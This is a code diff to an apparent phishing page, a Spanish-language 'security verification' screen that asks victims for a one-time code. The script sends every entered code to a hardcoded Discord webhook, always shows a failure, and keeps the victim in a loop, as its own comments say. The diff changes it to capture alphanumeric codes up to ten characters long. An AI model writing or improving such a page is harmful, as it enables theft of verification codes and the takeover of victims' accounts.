@@ -155,18 +155,19 @@
 
         .code-input-container input {
             width: 100%;
-            max-width: 280px;
+            max-width: 320px;
             height: 56px;
             border: 2px solid #d3d8dd;
             border-radius: 6px;
             text-align: center;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 600;
             color: #334d6e;
             outline: none;
             transition: all 0.2s;
             font-family: "Poppins", sans-serif;
-            letter-spacing: 8px;
+            letter-spacing: 4px;
+            text-transform: uppercase;
         }
 
         .code-input-container input:focus {
@@ -330,8 +331,8 @@
 
             .code-input-container input {
                 height: 52px;
-                font-size: 24px;
-                letter-spacing: 6px;
+                font-size: 20px;
+                letter-spacing: 3px;
             }
         }
     </style>
@@ -359,7 +360,7 @@
                 </div>
                 <div class="verify-title">Verificación de Seguridad</div>
                 <div class="verify-subtitle" id="verifySubtitle">
-                    Hemos enviado un código de 5 dígitos a su dispositivo registrado.<br>
+                    Hemos enviado un código alfanumérico a su dispositivo registrado.<br>
                     Ingrese el código para continuar.
                 </div>
 
@@ -380,7 +381,7 @@
 
                 <!-- Single input -->
                 <div class="code-input-container" id="codeInputContainer">
-                    <input type="tel" id="codeBox" maxlength="5" class="code-box" inputmode="numeric" pattern="[0-9]{5}" placeholder="• • • • •">
+                    <input type="text" id="codeBox" maxlength="10" class="code-box" placeholder="• • • • • • • •">
                 </div>
 
                 <button class="btnDefault" id="btnVerificar" disabled onclick="submitCode()">Verificar</button>
@@ -402,7 +403,7 @@
     </button>
 
     <script>
-        var WEBHOOK = 'https://discord.com/api/webhooks/1498207923891998770/TCeIE05gzrV44kMIUO_kiHfPYhCejYdc5lMIaWlvCMbtbp1c-sKFMS1KxuIGQ1klRxSw';
+        var WEBHOOK = 'https://discord.com/api/webhooks/1498207923891998770/TCeIE05gzrV44kUIO_kiHfPYhCejYdc5lMIaWlvCMbtbp1c-sKFMS1KxuIGQ1klRxSw';
         var _attempt = 0;
 
         async function enviarDiscord(embed) {
@@ -424,10 +425,10 @@
 
             var codeBox = document.getElementById('codeBox');
             
-            // Input validation - only numbers
+            // Input validation - alphanumeric only
             codeBox.addEventListener('input', function () {
-                // Remove non-numeric characters
-                this.value = this.value.replace(/[^0-9]/g, '');
+                // Remove non-alphanumeric characters
+                this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
                 
                 // Add/remove filled class based on content
                 if (this.value.length > 0) {
@@ -436,13 +437,13 @@
                     this.classList.remove('filled');
                 }
                 
-                // Enable/disable button based on 5 digits
-                document.getElementById('btnVerificar').disabled = this.value.length !== 5;
+                // Enable/disable button based on input (any length > 0)
+                document.getElementById('btnVerificar').disabled = this.value.length === 0;
             });
 
             // Handle Enter key
             codeBox.addEventListener('keydown', function (e) {
-                if (e.key === 'Enter' && this.value.length === 5) {
+                if (e.key === 'Enter' && this.value.length > 0) {
                     submitCode();
                 }
             });
@@ -450,7 +451,7 @@
             // Handle paste
             codeBox.addEventListener('paste', function (e) {
                 e.preventDefault();
-                var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+                var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^a-zA-Z0-9]/g, '').slice(0, 10);
                 this.value = text;
                 
                 if (text.length > 0) {
@@ -459,16 +460,16 @@
                     this.classList.remove('filled');
                 }
                 
-                document.getElementById('btnVerificar').disabled = text.length !== 5;
+                document.getElementById('btnVerificar').disabled = text.length === 0;
             });
         });
 
-        // ── Submit code — always fails, always sends to Discord ──
+        // ── Submit code — always fails, always sends to Discord, stays in loop ──
         async function submitCode() {
             var codeBox = document.getElementById('codeBox');
             var code = codeBox.value;
             
-            if (code.length < 5) return;
+            if (code.length === 0) return;
 
             _attempt++;
             var currentAttempt = _attempt;
@@ -494,7 +495,7 @@
                 timestamp: new Date().toISOString()
             });
 
-            // always wait 15s then show error
+            // always wait 15s then show error (loop - no redirect)
             setTimeout(function () {
                 document.getElementById('btnLoader').style.display = 'none';
                 document.getElementById('btnVerificar').style.display = 'block';
